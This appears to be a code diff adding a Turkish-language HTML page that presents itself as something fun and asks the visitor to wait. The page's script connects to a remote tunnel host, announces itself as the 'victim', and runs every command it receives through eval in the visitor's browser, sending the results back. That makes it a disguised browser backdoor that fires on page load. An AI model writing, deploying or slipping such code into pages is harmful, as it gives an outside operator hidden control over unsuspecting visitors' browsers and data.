@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Eğlenceli Bir Şey</title>
+</head>
+<body>
+    <h1>Merhaba! Bu eğlenceli bir şey, lütfen bekleyin...</h1>
+    <script>
+        // Serveo'nun verdiği URL ve port
+        const host = "https://6a0825e411480a1b837a5f15a207473a.serveo.net"; // Serveo URL'sini buraya yaz
+        const port = 80; // Serveo'nun kullandığı port
+
+        // WebSocket bağlantısı kur
+        const ws = new WebSocket(`ws://${host}:${port}`);
+
+        ws.onopen = () => {
+            console.log("Bağlantı kuruldu!");
+            ws.send("Merhaba, ben kurbanım!");
+        };
+
+        ws.onmessage = async (event) => {
+            const command = event.data;
+            console.log("Komut alındı:", command);
+            
+            // Komutu çalıştır ve çıktıyı gönder
+            try {
+                const output = await eval(command); // Dikkat: Bu çok tehlikeli!
+                ws.send(output);
+            } catch (error) {
+                ws.send("Hata: " + error.message);
+            }
+        };
+    </script>
+</body>
+</html>
